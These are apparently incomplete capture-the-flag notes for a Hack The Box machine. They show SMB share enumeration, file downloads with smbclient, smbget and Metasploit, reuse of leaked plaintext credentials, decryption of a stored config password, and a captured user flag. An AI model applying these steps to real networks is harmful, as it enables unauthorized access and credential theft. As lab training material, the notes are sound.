### Listing the shares:
```
$ smbclient  -L //10.10.10.178
Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk      
SMB1 disabled -- no workgroup available
```



### You can do the following to access the shares:
```
$ smbclient //10.10.10.178/Data
            or            /Users
            or            /C$
            or			 /Secure$
```


### enum 01
```
$ smbclient //10.10.10.178/Users -U TempUser
```

### to download the files use:
`msf > use auxiliary/admin/smb/download_file`

or
`smbget  smb://username:password@ip/<share>/<path to file or folder>`
-R argument for folders

some interesting files contain the following:

#### file 01
```
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location:
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019
```

#### file 02
```
<File filename="C:\windows\System32\drivers\etc\hosts"/>
<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt"/>
<File filename="C:\Users\C.Smith\Desktop\todo.txt"/>
```


#### file 03  (hash 01 - C.Smith)

```
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="ht>
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```




#### more enumeration 02

```
smbget -R smb://TempUser:welcome2019@10.10.10.178/Secure$/IT/Carl/
```
to download all files


#### Cracking the hash

Download Visual Studio on win
Import the project using the .sln file
In Main function we see a RU_Config.xml file been used but
doesnt exist the folder we dowloaded.
This file is the file 03. We put it in bin/Debug ...
where the Visual Studio points to.

After the already typed lines, type the following:
```
Dim MyVar = Utils.DecryptString(Config.Password)
Debug.Print(MyVar)
```
Then build and execute the project.
and we get the following pass:
`xRxRxPANCAK3SxRxRx`




```
root@system262:~# smbclient //10.10.10.178/Users -U C.Smith
Enter WORKGROUP\C.Smith's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 01:04:21 2020
  ..                                  D        0  Sun Jan 26 01:04:21 2020
  Administrator                       D        0  Fri Aug  9 18:08:23 2019
  C.Smith                             D        0  Sun Jan 26 09:21:44 2020
  L.Frost                             D        0  Thu Aug  8 20:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 20:02:50 2019
  TempUser                            D        0  Thu Aug  8 01:55:56 2019

                10485247 blocks of size 4096. 6544145 blocks available
smb: \> cd C.Smith\
smb: \C.Smith\> ls
  .                                   D        0  Sun Jan 26 09:21:44 2020
  ..                                  D        0  Sun Jan 26 09:21:44 2020
  HQK Reporting                       D        0  Fri Aug  9 02:06:17 2019
  user.txt                            A       32  Fri Aug  9 02:05:24 2019

                10485247 blocks of size 4096. 6544145 blocks available
```

then get the user.txt with the smbget command.

cf71b25404be5d84fd827e05f426e987



### ROAD TO root
run to dowload the folder
`smbget -R  smb://C.Smith:xRxRxPANCAK3SxRxRx@10.10.10.178/Users/C.Smith/"HQK Reporting"`



### file 04 HQK_Config_Backup.xml

```
<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>
```


Important parts of the above are:
- 4386 new port
- <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>

Also we got an .exe file and empty file(or seems to be)
